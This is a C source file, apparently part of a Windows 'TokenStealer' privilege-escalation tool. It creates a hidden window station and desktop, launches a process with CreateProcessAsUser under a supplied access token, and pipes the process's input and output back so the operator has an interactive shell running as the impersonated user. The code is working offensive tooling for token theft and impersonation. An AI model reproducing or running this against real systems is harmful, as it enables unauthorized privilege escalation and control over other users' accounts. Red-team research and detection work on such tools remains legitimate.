#define _CRT_SECURE_NO_DEPRECATE 1
#include <windows.h>
#include <stdio.h>
#define BUFSIZE 4096

static HANDLE hChildStdinRd, hChildStdinWr, hChildStdoutRd, hChildStdoutWr, hStdout;

HANDLE hINPUT, hOUTPUT;

extern BOOL HasAssignPriv;
extern BOOL Interactive;


DWORD WINAPI WriteToPipe(LPVOID);
DWORD WINAPI ReadFromPipe(LPVOID);
BOOL output_counted_string(char* string, DWORD dwRead)
{
	DWORD dwWritten;
	 if(hOUTPUT == stdout)
		return fwrite(string, sizeof(char), dwRead, stdout);
	else
		return WriteFile(hOUTPUT, string, dwRead, &dwWritten, NULL);
	return 1;
}

BOOL read_counted_input(char* string, int string_size, DWORD* dwRead)
{
	char* ret_value;

	if (hINPUT == stdin)
	{
		
		ret_value = fgets(string, 4096, stdin);
		//printf("stdin read:%s\n", string);
		//ret_value = fgets(string, BUFSIZE,stdin);
		*dwRead = strlen(string) + 1;
		return (BOOL)ret_value;
	}
	else
		return ReadFile(hINPUT, string, string_size, dwRead, NULL);
}



static DWORD WINAPI WriteToPipe(LPVOID p)
{
	DWORD dwRead,dwWritten;
	CHAR chBuf[BUFSIZE];

	for (;;)
	{
		//memset(chBuf, 0, sizeof(chBuf));
		if (!read_counted_input(chBuf, BUFSIZE, &dwRead))
			break;
		chBuf[dwRead - 1] = '\n';
		printf("\*WritePipe:[%s]\n", chBuf);
		if (!WriteFile(hChildStdinWr, chBuf, dwRead,
			&dwWritten, NULL)) {
			printf("errror wrting to pipe%d\n", GetLastError());
			break;
		}
	}
	return 0;
}

static DWORD WINAPI ReadFromPipe(LPVOID p)
{
	DWORD dwRead;
	CHAR chBuf[BUFSIZE];

	for (;;)
	{
		dwRead = 0;
		
		memset(chBuf, 0, sizeof(chBuf));
		if (!ReadFile(hChildStdoutRd, chBuf, BUFSIZE, &dwRead,
			NULL) || dwRead == 0) break;
		//printf("\*ReadPipe=[%s][%d]\n", chBuf,dwRead);
		if (!output_counted_string(chBuf, dwRead))
			break;
	}
	//printf("end reading fom pipe\n");
	return 0;
}

void CreateChildProcess(HANDLE token, wchar_t* command, PROCESS_INFORMATION* piProcInfo)
{
	STARTUPINFO siStartInfo;
	BOOL bFuncRetn = FALSE;
	HWINSTA new_winstation, old_winstation;
	
	// Set up members of the PROCESS_INFORMATION structure.
	ZeroMemory(piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure.
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = hChildStdoutWr;
	siStartInfo.hStdOutput = hChildStdoutWr;
	siStartInfo.hStdInput = hChildStdinRd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
	siStartInfo.lpDesktop = (LPWSTR)L"TokenStealer\\default";

	// Create new window station and save handle to existing one
	old_winstation = GetProcessWindowStation();
	new_winstation = CreateWindowStation(
		L"TokenStealer",
		(DWORD)NULL,
		MAXIMUM_ALLOWED,
		NULL
	);

	// Set process to new window station and create new desktop object within it
	SetProcessWindowStation(new_winstation);
	CreateDesktop(
		L"default",
		NULL,
		NULL,
		(DWORD)NULL,
		GENERIC_ALL,
		NULL
	);
	SetProcessWindowStation(old_winstation);

	// Create the child process.
	bFuncRetn = CreateProcessAsUser(
		token,
		NULL,
		command,     // command line
		NULL,          // process security attributes
		NULL,          // primary thread security attributes
		TRUE,          // handles are inherited
		0,             // creation flags
		NULL,          // use parent's environment
		NULL,          // use parent's current directory
		&siStartInfo,  // STARTUPINFO pointer
		piProcInfo);  // receives PROCESS_INFORMATION

	if (bFuncRetn == 0)
		printf("[-] Failed to create new process: %d\n", GetLastError());
}


void CreateProcessWithPipeComm(HANDLE token, wchar_t *command)
{
	// Set the bInheritHandle flag so pipe handles are inherited.
	PROCESS_INFORMATION piProcInfo;
	SECURITY_ATTRIBUTES saAttr;
	DWORD dwThreadId[2];
	HANDLE hThread[2];
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	// Get the handle to the current STDOUT.
	hStdout = GetStdHandle(STD_OUTPUT_HANDLE);

	// Create a pipe for the child process's STDOUT.
	if (!CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0))
	{
		printf("[-] Stdout pipe creation failed\n");
		return;
	}

	// Ensure the read handle to the pipe for STDOUT is not inherited.
	SetHandleInformation(hChildStdoutRd, HANDLE_FLAG_INHERIT, 0);

	// Create a pipe for the child process's STDIN.
	if (!CreatePipe(&hChildStdinRd, &hChildStdinWr, &saAttr, 0))
	{
		printf("[-] Stdin pipe creation failed\n");
		return;
	}

	// Ensure the write handle to the pipe for STDIN is not inherited.
	SetHandleInformation(hChildStdinWr, HANDLE_FLAG_INHERIT, 0);
	CreateChildProcess(token, command, &piProcInfo);

	hThread[0] = CreateThread(
		NULL,              // default security attributes
		0,                 // use default stack size
		ReadFromPipe,        // thread function
		NULL,             // argument to thread function
		0,                 // use default creation flags
		&dwThreadId[0]);   // returns the thread identifier

	hThread[1] = CreateThread(
		NULL,              // default security attributes
		0,                 // use default stack size
		WriteToPipe,        // thread function
		NULL,             // argument to thread function
		0,                 // use default creation flags
		&dwThreadId[1]);   // returns the thread identifier

	WaitForSingleObject(piProcInfo.hProcess, INFINITE);
}


